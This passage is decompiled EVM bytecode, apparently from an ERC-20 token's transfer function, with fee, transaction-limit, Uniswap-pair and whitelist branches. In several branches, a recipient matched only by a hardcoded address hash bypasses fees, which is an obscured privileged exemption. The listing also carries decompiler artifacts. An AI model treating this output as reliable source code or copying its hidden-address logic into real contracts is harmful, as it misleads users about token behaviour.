                                                        balanceOf[arg1] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 0, 17
                                                        if not arg2:
                                                            revert with 0, 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 0, 17
                                                        if balanceOf[0] > !(arg2 * _fee / 100):
                                                            revert with 0, 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                            revert with 0, 17
                                                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _12213 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12213 + 32 len mem[_12213]]):
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if this.address == arg1:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor16[address(arg1)]:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < 0:
                                                            revert with 0, 17
                                                        if balanceOf[0] > -1:
                                                            revert with 0, 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !arg2:
                                                            revert with 0, 17
                                                        balanceOf[arg1] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 0, 17
                                                        if not arg2:
                                                            revert with 0, 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 0, 17
                                                        if balanceOf[0] > !(arg2 * _fee / 100):
                                                            revert with 0, 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                            revert with 0, 17
                                                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
    else:
        mem[128] = address(arg1)
        mem[96] = 20
        if sha3(arg1) != 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
            if stor18:
                require ext_code.size(stor10)
                staticcall stor10.factory() with:
                        gas gas_remaining wei
                mem[148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                require ext_code.size(stor10)
                staticcall stor10.WETH() with:
                        gas gas_remaining wei
                mem[ceil32(return_data.size) + 148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[(2 * ceil32(return_data.size)) + 152] = this.address
                mem[(2 * ceil32(return_data.size)) + 184] = address(ext_call.return_data[0])
                require ext_code.size(address(ext_call.return_data[0]))
                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(ext_call.return_data[0])
                mem[(2 * ceil32(return_data.size)) + 148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                mem[64] = (4 * ceil32(return_data.size)) + 148
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                if ext_call.return_data[12 len 20] != msg.sender:
                    require ext_code.size(stor10)
                    staticcall stor10.factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor10)
                    staticcall stor10.WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if arg1 == ext_call.return_data[12 len 20]:
                        if stor16[address(msg.sender)]:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(arg1):
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if this.address == arg1:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor18:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if not arg2:
                                require arg2 <= _maxTxAmount
                                require ext_code.size(stor10)
                                staticcall stor10.factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(stor10)
                                staticcall stor10.WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2,
                                                  mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                stor19.length++
                                stor19[stor19.length].field_0 = arg1
                                stor66DE[stor19.length] = arg2
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2,
                                              mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                            else:
                                if arg2 and _fee > -1 / arg2:
                                    revert with 0, 17
                                if not arg2:
                                    revert with 0, 18
                                if arg2 * _fee / arg2 != _fee:
                                    revert with 0, 'SafeMath: multiplication overflow'
                                require arg2 <= _maxTxAmount
                                require ext_code.size(stor10)
                                staticcall stor10.factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(stor10)
                                staticcall stor10.WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 0, 17
                                    if balanceOf[0] > !(arg2 * _fee / 100):
                                        revert with 0, 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                        revert with 0, 17
                                    balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 - (arg2 * _fee / 100),
                                                  mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    if arg2 * _fee / 100:
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 * _fee / 100,
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      0,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                stor19.length++
                                stor19[stor19.length].field_0 = arg1
                                stor66DE[stor19.length] = arg2
                                if arg2 < arg2 * _fee / 100:
                                    revert with 0, 17
                                if balanceOf[0] > !(arg2 * _fee / 100):
                                    revert with 0, 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                    revert with 0, 17
                                balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 - (arg2 * _fee / 100),
                                              mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                if arg2 * _fee / 100:
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 * _fee / 100,
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  0,
                            return 1, mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)]
                    require ext_code.size(stor10)
                    staticcall stor10.factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor10)
                    staticcall stor10.WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if stor16[address(msg.sender)]:
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if stor16[address(arg1)]:
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(arg1):
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if this.address == arg1:
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if ext_call.return_data[12 len 20] != msg.sender:
                        if msg.sender == address(ext_call.return_data[0]):
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    else:
                        if stor16[address(arg1)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    if stor18:
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if not arg2:
                        require arg2 <= _maxTxAmount
                        require ext_code.size(stor10)
                        staticcall stor10.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor10)
                        staticcall stor10.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 268] = this.address
                        mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2,
                                          mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                        stor19.length++
                        stor19[stor19.length].field_0 = arg1
                        stor66DE[stor19.length] = arg2
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2,
                                      mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                    else:
                        if arg2 and _fee > -1 / arg2:
                            revert with 0, 17
                        if not arg2:
                            revert with 0, 18
                        if arg2 * _fee / arg2 != _fee:
                            revert with 0, 'SafeMath: multiplication overflow'
                        require arg2 <= _maxTxAmount
                        require ext_code.size(stor10)
                        staticcall stor10.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor10)
                        staticcall stor10.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 268] = this.address
                        mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < arg2 * _fee / 100:
                                revert with 0, 17
                            if balanceOf[0] > !(arg2 * _fee / 100):
                                revert with 0, 17
                            balanceOf[0] += arg2 * _fee / 100
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                revert with 0, 17
                            balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 - (arg2 * _fee / 100),
                                          mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            if arg2 * _fee / 100:
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 * _fee / 100,
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              0,
                            return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                        stor19.length++
                        stor19[stor19.length].field_0 = arg1
                        stor66DE[stor19.length] = arg2
                        if arg2 < arg2 * _fee / 100:
                            revert with 0, 17
                        if balanceOf[0] > !(arg2 * _fee / 100):
                            revert with 0, 17
                        balanceOf[0] += arg2 * _fee / 100
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                            revert with 0, 17
                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2 - (arg2 * _fee / 100),
                                      mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                        if arg2 * _fee / 100:
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 * _fee / 100,
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          0,
